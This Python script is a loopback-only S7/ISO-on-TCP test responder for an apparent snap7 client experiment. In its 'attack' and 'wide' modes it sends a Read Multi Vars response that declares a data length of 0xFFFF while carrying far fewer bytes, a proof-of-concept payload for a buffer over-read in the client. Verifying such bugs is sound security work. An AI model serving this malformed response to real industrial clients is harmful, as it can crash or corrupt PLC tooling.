#!/usr/bin/env python3
"""Minimal loopback S7/ISO-on-TCP responder for the snap7 live experiment.

Speaks only the three exchanges the pinned TSnap7MicroClient needs: COTP
connect, S7 Setup Communication (negotiate PDU length) and one Read Multi
Vars response. Never binds outside 127.0.0.1 and never contacts a real PLC.
"""
import socket
import sys

mode = sys.argv[1]                 # attack | safe
port_file = sys.argv[2]
log_file = sys.argv[3]

log = open(log_file, "w", buffering=1)


def note(msg):
    log.write(msg + "\n")


srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 0))
srv.listen(1)
srv.settimeout(30)
port = srv.getsockname()[1]
with open(port_file, "w") as pf:
    pf.write(str(port))
note("MODE=%s BIND=127.0.0.1:%d" % (mode, port))

conn, peer = srv.accept()
conn.settimeout(10)
note("ACCEPT from %s:%d" % (peer[0], peer[1]))


def recvn(n):
    out = b""
    while len(out) < n:
        chunk = conn.recv(n - len(out))
        if not chunk:
            raise EOFError("peer closed")
        out += chunk
    return out


def recv_frame():
    hdr = recvn(4)
    if hdr[0] != 3:
        raise ValueError("bad TPKT version: %s" % hdr.hex())
    total = (hdr[2] << 8) | hdr[3]
    rest = recvn(total - 4)
    frame = hdr + rest
    note("RECV hex=" + frame.hex())
    return frame


def send_data(payload):
    total = 7 + len(payload)
    frame = bytes([3, 0, (total >> 8) & 0xFF, total & 0xFF, 2, 0xF0, 0x80]) + payload
    note("SEND hex=" + frame.hex())
    conn.sendall(frame)


def send_control(frame):
    note("SEND hex=" + frame.hex())
    conn.sendall(frame)


def u16(v):
    return bytes([(v >> 8) & 0xFF, v & 0xFF])


# --- COTP connection request -> connection confirm -------------------------
cr = recv_frame()
if cr[5] != 0xE0:
    raise ValueError("expected COTP CR, got %02x" % cr[5])
cc = bytearray(cr)
cc[5] = 0xD0                     # Connection confirm
old_src = bytes(cr[8:10])
cc[6:8] = old_src                # DstRef <- SrcRef
cc[8:10] = b"\x01\x00"          # SrcRef, as the pinned client does
send_control(bytes(cc))

# --- S7 telegrams ----------------------------------------------------------
seen_negotiate = False
seen_read = False
for _ in range(8):
    frame = recv_frame()
    if len(frame) < 17 or frame[5] != 0xF0 or frame[7] != 0x32:
        raise ValueError("unexpected frame")
    payload = frame[7:]
    func = payload[10]
    seq = payload[4:6]

    if func == 0xF0 and not seen_negotiate:
        seen_negotiate = True
        # 12-byte S7 response header + 8-byte negotiate parameters.
        resp = (b"\x32\x02\x00\x00" + seq + u16(8) + u16(0) + u16(0) +
                b"\xf0\x00" + u16(0x0100) + u16(0x0100) + u16(480))
        send_data(resp)

    elif func == 0x04 and not seen_read:
        seen_read = True
        if mode == "attack":
            declared = 0xFFFF
            data = bytes((0x5A if i % 2 == 0 else 0x6B) for i in range(32))
        elif mode == "safe":
            declared = 1
            data = b"\x5a"
        elif mode == "wide":
            # Largest read response that fits CheckPDU's 4096-byte TPKT cap:
            # 7 TPKT/COTP + 12 S7 header + 2 params + 4 item header = 25 bytes
            # of overhead, so at most 4071 data bytes. Use 4000 for headroom.
            # A 4-byte pattern makes every copied offset checkable.
            declared = 0xFFFF
            pat = bytes([0x11, 0x22, 0x33, 0x44])
            data = bytes(pat[i % 4] for i in range(4000))
        else:
            raise ValueError("unknown mode: %s" % mode)
        # 12-byte header, 2-byte read params (FunRead, ItemCount),
        # 4-byte item header (ReturnCode, TransportSize, DataLength), data.
        resp = (b"\x32\x02\x00\x00" + seq + u16(2) + u16(4 + len(data)) +
                u16(0) + b"\x04\x01" + b"\xff\x09" + u16(declared) + data)
        send_data(resp)
        note("DECLARED_DATA_LENGTH=%d REAL_BYTES=%d" % (declared, len(data)))
        break
    else:
        raise ValueError("unexpected S7 function %02x" % func)

note("SERVER_DONE negotiate=%s read=%s" % (seen_negotiate, seen_read))
conn.close()
srv.close()
log.close()
